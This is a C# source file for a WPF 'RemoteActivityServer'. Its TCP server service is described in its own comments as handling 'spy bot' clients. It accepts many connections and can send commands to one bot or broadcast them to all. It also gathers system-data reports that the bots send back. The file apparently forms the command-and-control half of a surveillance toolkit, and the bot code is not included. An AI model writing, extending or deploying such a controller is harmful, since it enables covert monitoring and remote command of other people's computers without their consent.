using System.Collections.ObjectModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows;
using Newtonsoft.Json;
using RemoteActivityServer.Models;

namespace RemoteActivityServer.Services
{
    /// <summary>
    /// TCP server service for handling multiple spy bot client connections
    /// </summary>
    public class TcpServerService
    {
        private TcpListener? _tcpListener;
        private bool _isListening;
        private readonly int _port;
        private CancellationTokenSource? _cancellationTokenSource;
        
        /// <summary>
        /// Collection of connected clients
        /// </summary>
        public ObservableCollection<ClientConnection> ConnectedClients { get; private set; }
        
        /// <summary>
        /// Event fired when a new client connects
        /// </summary>
        public event EventHandler<ClientConnection>? ClientConnected;
        
        /// <summary>
        /// Event fired when a client disconnects
        /// </summary>
        public event EventHandler<ClientConnection>? ClientDisconnected;
        
        /// <summary>
        /// Event fired when data is received from a client
        /// </summary>
        public event EventHandler<(ClientConnection Client, SystemData Data)>? DataReceived;
        
        /// <summary>
        /// Event fired when server status changes
        /// </summary>
        public event EventHandler<string>? StatusChanged;
        
        /// <summary>
        /// Constructor for TcpServerService
        /// </summary>
        /// <param name="port">Port number to listen on</param>
        public TcpServerService(int port = 8888)
        {
            _port = port;
            ConnectedClients = new ObservableCollection<ClientConnection>();
            _isListening = false;
        }
        
        /// <summary>
        /// Start the TCP server
        /// </summary>
        /// <returns>True if server started successfully</returns>
        public Task<bool> StartServerAsync()
        {
            try
            {
                if (_isListening) return Task.FromResult(false);
                
                _tcpListener = new TcpListener(IPAddress.Any, _port);
                _tcpListener.Start();
                _isListening = true;
                _cancellationTokenSource = new CancellationTokenSource();
                
                StatusChanged?.Invoke(this, $"Server started on port {_port}");
                
                // Start accepting clients in background
                _ = Task.Run(AcceptClientsAsync, _cancellationTokenSource.Token);
                
                return Task.FromResult(true);
            }
            catch (Exception ex)
            {
                StatusChanged?.Invoke(this, $"Failed to start server: {ex.Message}");
                return Task.FromResult(false);
            }
        }
        
        /// <summary>
        /// Stop the TCP server
        /// </summary>
        public async Task StopServerAsync()
        {
            try
            {
                _isListening = false;
                _cancellationTokenSource?.Cancel();
                
                // Disconnect all clients
                var clientsToDisconnect = ConnectedClients.ToList();
                foreach (var client in clientsToDisconnect)
                {
                    await DisconnectClientAsync(client);
                }
                
                _tcpListener?.Stop();
                StatusChanged?.Invoke(this, "Server stopped");
            }
            catch (Exception ex)
            {
                StatusChanged?.Invoke(this, $"Error stopping server: {ex.Message}");
            }
        }
        
        /// <summary>
        /// Send command to a specific client
        /// </summary>
        /// <param name="client">Target client</param>
        /// <param name="command">Command to send</param>
        /// <returns>True if command sent successfully</returns>
        public async Task<bool> SendCommandToClientAsync(ClientConnection client, string command)
        {
            try
            {
                if (client.Stream == null || !client.IsConnected) return false;
                
                var commandData = JsonConvert.SerializeObject(new
                {
                    type = "command",
                    command = command,
                    timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
                });
                
                byte[] data = Encoding.UTF8.GetBytes(commandData);
                byte[] lengthPrefix = BitConverter.GetBytes(data.Length);
                
                await client.Stream.WriteAsync(lengthPrefix, 0, lengthPrefix.Length);
                await client.Stream.WriteAsync(data, 0, data.Length);
                
                return true;
            }
            catch (Exception ex)
            {
                StatusChanged?.Invoke(this, $"Failed to send command to client {client.DisplayName}: {ex.Message}");
                return false;
            }
        }
        
        /// <summary>
        /// Send broadcast command to all connected clients
        /// </summary>
        /// <param name="command">Command to broadcast</param>
        /// <returns>Number of clients that received the command</returns>
        public async Task<int> BroadcastCommandAsync(string command)
        {
            int successCount = 0;
            var clients = ConnectedClients.ToList();
            
            foreach (var client in clients)
            {
                if (await SendCommandToClientAsync(client, command))
                {
                    successCount++;
                }
            }
            
            return successCount;
        }
        
        /// <summary>
        /// Disconnect a specific client
        /// </summary>
        /// <param name="client">Client to disconnect</param>
        public async Task DisconnectClientAsync(ClientConnection client)
        {
            try
            {
                client.Status = ConnectionStatus.Disconnected;
                client.Stream?.Close();
                client.TcpClient?.Close();
                
                // Remove from collection on UI thread
                await Application.Current.Dispatcher.InvokeAsync(() =>
                {
                    ConnectedClients.Remove(client);
                });
                
                ClientDisconnected?.Invoke(this, client);
                StatusChanged?.Invoke(this, $"Client {client.DisplayName} disconnected");
            }
            catch (Exception ex)
            {
                StatusChanged?.Invoke(this, $"Error disconnecting client: {ex.Message}");
            }
        }
        
        /// <summary>
        /// Get server statistics
        /// </summary>
        /// <returns>Server statistics object</returns>
        public ServerStats GetServerStats()
        {
            return new ServerStats
            {
                IsRunning = _isListening,
                Port = _port,
                ConnectedClientCount = ConnectedClients.Count,
                TotalDataReceived = ConnectedClients.Sum(c => c.LatestData != null ? 1 : 0),
                UptimeStart = DateTime.Now // This should be tracked properly in production
            };
        }
        
        /// <summary>
        /// Accept incoming client connections
        /// </summary>
        private async Task AcceptClientsAsync()
        {
            while (_isListening && _tcpListener != null)
            {
                try
                {
                    var tcpClient = await _tcpListener.AcceptTcpClientAsync();
                    var clientEndpoint = tcpClient.Client.RemoteEndPoint as IPEndPoint;
                    
                    var client = new ClientConnection
                    {
                        TcpClient = tcpClient,
                        Stream = tcpClient.GetStream(),
                        IpAddress = clientEndpoint?.Address.ToString() ?? "Unknown",
                        DisplayName = $"Client_{clientEndpoint?.Address.ToString().Replace(".", "_")}_{DateTime.Now:HHmmss}",
                        ConnectedAt = DateTime.Now,
                        LastDataReceived = DateTime.Now,
                        Status = ConnectionStatus.Connected
                    };
                    
                    // Add to collection on UI thread
                    await Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        ConnectedClients.Add(client);
                    });
                    
                    ClientConnected?.Invoke(this, client);
                    StatusChanged?.Invoke(this, $"New client connected: {client.DisplayName}");
                    
                    // Start listening for data from this client
                    _ = Task.Run(() => HandleClientCommunicationAsync(client));
                }
                catch (ObjectDisposedException)
                {
                    // Server was stopped
                    break;
                }
                catch (Exception ex)
                {
                    StatusChanged?.Invoke(this, $"Error accepting client: {ex.Message}");
                }
            }
        }
        
        /// <summary>
        /// Handle communication with a specific client
        /// </summary>
        /// <param name="client">Client to handle</param>
        private async Task HandleClientCommunicationAsync(ClientConnection client)
        {
            var buffer = new byte[4];
            
            try
            {
                while (client.IsConnected && _isListening)
                {
                    // Read data length prefix
                    int bytesRead = await client.Stream!.ReadAsync(buffer, 0, 4);
                    if (bytesRead != 4) break;
                    
                    int dataLength = BitConverter.ToInt32(buffer, 0);
                    if (dataLength <= 0 || dataLength > 10 * 1024 * 1024) // Max 10MB
                    {
                        StatusChanged?.Invoke(this, $"Invalid data length from client {client.DisplayName}: {dataLength}");
                        break;
                    }
                    
                    // Read actual data
                    var dataBuffer = new byte[dataLength];
                    int totalRead = 0;
                    
                    while (totalRead < dataLength)
                    {
                        bytesRead = await client.Stream.ReadAsync(dataBuffer, totalRead, dataLength - totalRead);
                        if (bytesRead == 0) break;
                        totalRead += bytesRead;
                    }
                    
                    if (totalRead != dataLength) break;
                    
                    // Parse received data
                    string jsonData = Encoding.UTF8.GetString(dataBuffer);
                    var systemData = JsonConvert.DeserializeObject<SystemData>(jsonData);
                    
                    if (systemData != null)
                    {
                        client.LatestData = systemData;
                        client.LastDataReceived = DateTime.Now;
                        client.ClientId = systemData.ClientId;
                        
                        // Update display name if we have client ID
                        if (!string.IsNullOrEmpty(systemData.ClientId) && client.DisplayName.StartsWith("Client_"))
                        {
                            client.DisplayName = systemData.ClientId;
                        }
                        
                        DataReceived?.Invoke(this, (client, systemData));
                    }
                }
            }
            catch (Exception ex)
            {
                StatusChanged?.Invoke(this, $"Error handling client {client.DisplayName}: {ex.Message}");
            }
            finally
            {
                await DisconnectClientAsync(client);
            }
        }
    }
    
    /// <summary>
    /// Server statistics
    /// </summary>
    public class ServerStats
    {
        public bool IsRunning { get; set; }
        public int Port { get; set; }
        public int ConnectedClientCount { get; set; }
        public int TotalDataReceived { get; set; }
        public DateTime UptimeStart { get; set; }
        
        public TimeSpan Uptime => DateTime.Now - UptimeStart;
    }
} 